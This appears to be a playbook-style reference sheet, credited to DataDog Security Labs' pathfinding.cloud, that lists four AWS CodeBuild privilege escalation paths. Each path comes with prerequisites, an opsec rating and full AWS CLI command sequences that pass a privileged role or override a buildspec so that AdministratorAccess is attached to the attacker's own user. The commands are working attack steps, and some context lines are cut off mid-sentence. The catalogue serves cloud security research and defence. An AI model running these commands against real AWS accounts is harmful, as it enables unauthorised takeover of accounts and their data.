# CodeBuild - AWS IAM Privilege Escalation Paths
> Source: pathfinding.cloud (DataDog Security Labs)

### iam:PassRole + codebuild:CreateProject + codebuild:StartBuild [added: 2026-04]
- **Tags:** #Iam #Codebuild #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + codebuild service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, codebuild:CreateProject, codebuild:StartBuild; A role must exist that trusts codebuild.amazonaws.com to assume it
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [codebuild-001] A principal with `iam:PassRole`, `codebuild:CreateProject`, and `codebuild:StartBuild` can create a new CodeBuild project and attach an existing privileged IAM role to it. By starting a build with a malicious buildspec, the attacker can execute arbitrary code with the permissions of the attached role, allowing privilege escalation. This is a classic "pass role to service" privilege escalation patt
- **Payload/Method:**
```
# Step 1: Discover roles that trust codebuild.amazonaws.com (optional but helpful for finding privileged roles to pass)
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.Service==`codebuild.amazonaws.com`]].RoleName'

# Step 2: Create a CodeBuild project with the privileged role and malicious buildspec that attaches AdministratorAccess to your us
aws codebuild create-project --name privesc-project --source "{\"type\":\"NO_SOURCE\",\"buildspec\":\"version: 0.2\nphases:\n  build:\n    commands:\n      - echo \\\"Starting privilege escalation...\\\"\n      - aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n      - echo \\\"Successfully attached AdministratorAccess!\\\"\"}" --artifacts type=NO_ARTIFACTS --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL --service-role arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE

# Step 3: Start the build to execute code with elevated privileges
aws codebuild start-build --project-name privesc-project

# Step 4: Monitor the build status and wait for completion
aws codebuild batch-get-builds --ids BUILD_ID

# Step 5: Verify administrative access was successfully obtained (wait 15-30 seconds for IAM propagation)
aws iam list-users --max-items 3
```

### codebuild:StartBuild [added: 2026-04]
- **Tags:** #Codebuild #Iam #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** PassRole on existing resource found; codebuild + iam in scope
- **Prereq:** IAM perms: codebuild:StartBuild; A CodeBuild project must already exist in the account
- **Yields:** Code execution as existing privileged role on service
- **Opsec:** Low
- **Context:** [codebuild-002] A principal with `codebuild:StartBuild` can exploit an existing CodeBuild project that has a privileged service role by using the `--buildspec-override` parameter to execute arbitrary commands with elevated permissions. Unlike the PassRole+CreateProject attack, this path does NOT require `iam:PassRole` or `codebuild:CreateProject` permissions. The attacker can replace the project's buildspec with 
- **Payload/Method:**
```
# Step 1: Discover existing CodeBuild projects in the account (optional but helpful for reconnaissance)
aws codebuild list-projects --region us-east-1

# Step 2: Inspect the project details to identify the service role ARN and verify it has elevated permissions (optional but helpfu
aws codebuild batch-get-projects --names EXISTING_PROJECT_NAME --region us-east-1

# Step 3: Start a build with a malicious buildspec that executes with the project's privileged service role. This example attaches
aws codebuild start-build \
  --project-name EXISTING_PROJECT_NAME \
  --region us-east-1 \
  --buildspec-override "version: 0.2
phases:
  build:
    commands:
      - echo 'Starting privilege escalation...'
      - aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
      - echo 'Successfully attached AdministratorAccess policy'"

# Step 4: Monitor the build status to confirm it completed successfully
aws codebuild batch-get-builds --ids BUILD_ID --region us-east-1

# Step 5: Verify administrative access was successfully obtained (wait 15-30 seconds for IAM propagation)
aws iam list-users --max-items 3
```

### codebuild:StartBuildBatch [added: 2026-04]
- **Tags:** #Codebuild #Iam #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** PassRole on existing resource found; codebuild + iam in scope
- **Prereq:** IAM perms: codebuild:StartBuildBatch; A CodeBuild project must already exist in the account that is configured for bat
- **Yields:** Code execution as existing privileged role on service
- **Opsec:** Low
- **Context:** [codebuild-003] A principal with `codebuild:StartBuildBatch` can exploit an existing CodeBuild project that has a privileged service role by using the `--buildspec-override` parameter to execute arbitrary commands with elevated permissions. Similar to `codebuild:StartBuild`, this permission allows injecting malicious buildspecs without requiring `iam:PassRole` or `codebuild:CreateProject` permissions. The attacke
- **Payload/Method:**
```
# Step 1: Discover existing CodeBuild projects in the account (optional but helpful for reconnaissance)
aws codebuild list-projects --region us-east-1

# Step 2: Inspect the project details to identify the service role ARN and verify it has elevated permissions (optional but helpfu
aws codebuild batch-get-projects --names EXISTING_PROJECT_NAME --region us-east-1

# Step 3: Create a malicious buildspec file with batch build format that attaches AdministratorAccess to your user account
cat > /tmp/malicious-buildspec.yml <<'EOF'
version: 0.2
batch:
  fast-fail: false
  build-list:
    - identifier: privesc_build
      buildspec: |
        version: 0.2
        phases:
          build:
            commands:
              - echo "Starting privilege escalation..."
              - aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
              - echo "Successfully attached AdministratorAccess policy"
EOF

# Step 4: Start a build batch with the malicious buildspec override. The buildspec executes with the project's privileged service 
aws codebuild start-build-batch \
  --project-name EXISTING_PROJECT_NAME \
  --region us-east-1 \
  --buildspec-override file:///tmp/malicious-buildspec.yml

# Step 5: Monitor the build batch status to confirm it completed successfully (batch builds may take 2-4 minutes)
aws codebuild batch-get-build-batches --ids BUILD_BATCH_ID --region us-east-1
```

### iam:PassRole + codebuild:CreateProject + codebuild:StartBuildBatch [added: 2026-04]
- **Tags:** #Iam #Codebuild #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + codebuild service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, codebuild:CreateProject, codebuild:StartBuildBatch; A role must exist that trusts codebuild.amazonaws.com to assume it
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [codebuild-004] A principal with `iam:PassRole`, `codebuild:CreateProject`, and `codebuild:StartBuildBatch` can create a new CodeBuild project configured for batch builds and attach an existing privileged IAM role to it. By starting a build batch with a malicious buildspec, the attacker can execute arbitrary code with the permissions of the attached role, allowing privilege escalation. This variation specifically
- **Payload/Method:**
```
# Step 1: Discover roles that trust codebuild.amazonaws.com (optional but helpful for finding privileged roles to pass)
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.Service==`codebuild.amazonaws.com`]].RoleName'

# Step 2: Create a CodeBuild project configured for batch builds with the privileged role and malicious buildspec in batch format
aws codebuild create-project --name privesc-batch-project --source "{\"type\":\"NO_SOURCE\",\"buildspec\":\"version: 0.2\nbatch:\n  fast-fail: false\n  build-list:\n    - identifier: privesc_build\n      buildspec: |\n        version: 0.2\n        phases:\n          build:\n            commands:\n              - echo \\\"Starting privilege escalation...\\\"\n              - aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n              - echo \\\"Successfully attached AdministratorAccess!\\\"\"}" --artifacts type=NO_ARTIFACTS --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL --service-role arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE --build-batch-config serviceRole=arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE

# Step 3: Start the build batch to execute code with elevated privileges
aws codebuild start-build-batch --project-name privesc-batch-project

# Step 4: Monitor the build batch status and wait for completion (batch builds typically take 2-4 minutes)
aws codebuild batch-get-build-batches --ids BUILD_BATCH_ID

# Step 5: Verify administrative access was successfully obtained (wait 15-30 seconds for IAM propagation)
aws iam list-users --max-items 3
```
